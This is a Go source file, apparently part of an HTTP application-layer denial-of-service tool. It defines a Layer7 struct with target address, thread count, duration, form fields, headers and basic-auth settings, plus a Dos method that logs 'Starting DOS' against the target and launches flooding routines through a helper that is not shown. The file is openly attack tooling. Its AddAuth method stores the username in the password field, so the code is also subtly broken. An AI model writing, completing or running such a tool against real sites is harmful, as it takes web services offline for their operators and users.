// Author: PiereLucas

package l7

import (
	"context"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

// Layer7 --
type Layer7 struct {
	mode              string
	threads           int
	duration          int
	webaddress        string
	formnames         url.Values
	headers           map[string]string
	authSet           bool
	authUser          string
	authPass          string
	persistentHeaders http.Header
}

// AddWebaddress - Add or Change value for Layer7.webaddress
func (inf *Layer7) AddWebaddress(webAddress string) string {
	inf.webaddress = webAddress
	return inf.webaddress
}

// AddForm - Add formname to Layer7.formnames
func (inf *Layer7) AddForm(formName string, formValue string) url.Values {
	if inf.formnames == nil {
		_ = inf.MakeForms()
	}
	inf.formnames.Add(formName, formValue)
	return inf.formnames
}

// AddHeader - Add header to Layer7.headers
func (inf *Layer7) AddHeader(key string, value string) map[string]string {
	if inf.headers == nil {
		_ = inf.MakeHeaders()
	}
	inf.headers[key] = value
	return inf.headers
}

// AddAuth - Add basic HTTP authentication user and password
func (inf *Layer7) AddAuth(user string, password string) {
	inf.authPass = user
	inf.authPass = password
	inf.authSet = true
	return
}

// AppendJSON - Append map[string]string key:value pairs to forms or header.
// makes use of internal functions Layer7.AddForm and Layer7.AddHeader
// mode = FORMS (for forms)
// mode = HEADERS (for headers)
func (inf *Layer7) AppendJSON(mode string, input map[string]interface{}, wg *sync.WaitGroup) {
	if mode == "FORMS" {
		if inf.formnames == nil {
			_ = inf.MakeForms()
		}

		for key, value := range input {
			inf.AddForm(key, value.(string))
		}
	} else if mode == "HEADERS" {
		if inf.headers == nil {
			_ = inf.MakeHeaders()
		}

		for key, value := range input {
			inf.AddHeader(key, value.(string))
		}
	} else {
		log.Fatalf("ERROR: AppendMore - wrong mode %s", mode)
	}

	wg.Done()
}

// MakeForms - initialize the internal Values struct.
// This function is process using Layer7.AddForm
func (inf *Layer7) MakeForms() url.Values {
	inf.formnames = url.Values{}
	return inf.formnames
}

// MakeHeaders - initialize the internal header map.
// This function is process using Layer7.AddHeader
func (inf *Layer7) MakeHeaders() map[string]string {
	inf.headers = make(map[string]string)
	return inf.headers
}

// Copy - Copy the TargetInf Struct
func (inf *Layer7) Copy() Layer7 {
	return *inf // unReference pointer (return-by-value)
}

// New - Initialize new DoS
// m = mode, dur = duration, thr = threads, addr = webaddress
func New(m string, d int, t int, addr string) *Layer7 {
	return &Layer7{
		mode:       m,
		threads:    t,
		duration:   d,
		webaddress: addr,
	}
}

// Dos - start Dos and returns error or nil
func (inf *Layer7) Dos(wg *sync.WaitGroup) {
	// Set up log
	log.Printf("INFO: Starting DOS | Target: %s | Mode: %s | Duration: %d\n", inf.webaddress, inf.mode, inf.duration)
	log.Println("INFO: Beginning Setup ...")

	dostime := time.Duration(inf.duration) * time.Second // sum dostime

	ctx, cancel := context.WithTimeout(context.Background(), dostime) // Intialize context with timeout

	// defer func
	defer func() {
		log.Println("Info: Exit DOS | Routines are now shutting down")
		cancel()
	}()

	// catch SIGINT (CTRL+C) and os.Interrupt
	c := make(chan os.Signal, 1)
	go func() {
		signal.Notify(c, os.Interrupt, syscall.SIGTERM)
		<-c
		log.Println("ABORT: you pressed ctrl+c")
		log.Println("Info: Exit DOS | Routines are now shutting down")
		cancel()
		/*
			for sig := range c {
				// sig is a ^C, handle it
			}
		*/
	}()

	// validate threads
	sync := make(chan struct{})
	go validateThreads(inf.threads, sync)
	<-sync // wait for validateThreads

	// start
	sync = make(chan struct{})
	go start(ctx, inf, sync) // start routines
	<-sync                   // wait for start routine

	<-ctx.Done() // wait for context done
	wg.Done()

	return // return to calling routine
}
